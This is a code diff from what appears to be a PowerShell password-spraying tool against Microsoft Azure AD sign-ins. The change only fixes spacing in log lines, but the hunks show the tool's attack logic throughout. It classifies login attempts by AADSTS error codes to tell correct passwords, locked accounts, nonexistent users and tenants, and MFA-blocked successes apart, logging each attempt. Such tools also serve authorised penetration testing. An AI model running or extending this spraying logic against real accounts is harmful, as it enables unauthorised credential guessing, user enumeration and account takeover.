@@ -86,14 +86,14 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
                 Write-Host "    The password for $un appears to be incorrect."
                 $result = "Failure"
                 # username isn't working correctly yet
-                $sprayResult += "$datetime, $result,  $un, $passes"
+                $sprayResult += "$datetime, $result, $un, $passes"
             }
             # Account Locked
             ElseIf($errRes -match "AADSTS50053")
             {
                 Write-Host -ForegroundColor "red" "    WARNING! $un appears to be locked, skipping further attempts"
                 $result = "Account Locked"
-                $sprayResult += "$datetime, $result,  $un, $passes"
+                $sprayResult += "$datetime, $result, $un, $passes"
                 break
             }
             # Invalid Username
@@ -101,7 +101,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
             {
                 Write-Host -ForegroundColor "yellow" "    $un doesn't exist, skipping further attempts.."
                 $result = "User Does Not Exist"
-                $sprayResult += "$datetime, $result,  $un, $passes"
+                $sprayResult += "$datetime, $result, $un, $passes"
                 break
             }
             # Invalid Tenant
@@ -109,7 +109,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
             {
                 Write-Host "    Supplied tenant for $un doesn't exist, skipping further attempts.."
                 $result = "Tenant Does Not Exist"
-                $sprayResult += "$datetime, $result,  $un, $passes"
+                $sprayResult += "$datetime, $result, $un, $passes"
                 break
             }
             # MFA
@@ -117,7 +117,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
             {
                 Write-Host -ForegroundColor "Cyan" "[*] Password for $un is correct but user has MFA enabled (DUO or MS)"
                 $result = "Success, MFA Blocked"
-                $sprayResult += "$datetime, $result,  $un, $passes"
+                $sprayResult += "$datetime, $result, $un, $passes"
                 break
             }
         }
